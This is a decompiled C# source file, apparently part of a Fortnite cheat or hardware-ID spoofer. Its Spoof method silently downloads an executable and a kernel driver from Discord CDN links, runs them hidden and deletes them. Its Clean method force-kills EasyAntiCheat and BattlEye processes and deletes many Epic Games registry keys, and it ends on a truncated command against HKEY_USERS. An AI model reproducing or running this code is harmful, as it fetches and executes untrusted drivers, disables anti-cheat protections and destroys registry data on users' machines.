using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace KeyAuth
{
	// Token: 0x02000011 RID: 17
	internal class Spoofer
	{
		// Token: 0x060000A4 RID: 164 RVA: 0x00006EB0 File Offset: 0x000050B0
		public static void Spoof()
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\IME\\NullSMDisk.exe";
			string text2 = "C:\\Windows\\IME\\NullSMDisk.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1079372843269247056/1079372902295675020/NullSMDisk.sys", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1079372843269247056/1079372902006263868/NullSMDisk.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process2 = Process.Start(text, text2);
			Thread.Sleep(1000);
			process2.Close();
			File.Delete(text2);
			File.Delete(text);
		}

		// Token: 0x060000A5 RID: 165 RVA: 0x00006F40 File Offset: 0x00005140
		public static void Clean()
		{
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("taskkill /f /im UnrealCEFSubProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im CEFProcess.exe");
			process.StandardInput.WriteLine("taskkill /f /im EasyAntiCheat.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEService.exe");
			process.StandardInput.WriteLine("taskkill /f /im BEServices.exe");
			process.StandardInput.WriteLine("taskkill /f /im BattleEye.exe");
			process.StandardInput.WriteLine("taskkill /f /im epicgameslauncher.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_EAC.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteClient-Win64-Shipping_BE.exe");
			process.StandardInput.WriteLine("taskkill /f /im FortniteLauncher.exe");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CLASSES_ROOT\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\Software\\Epic Games\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Hardware Survey\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\Software\\Epic Games\\Unreal Engine\\Identifiers\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\com.epicgames.launcher\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\EpicGames\" /f");
			process.StandardInput.WriteLine("reg delete \"HKEY_USERS\\");
			process.StandardInput.WriteLine("exit");
		}
	}
}
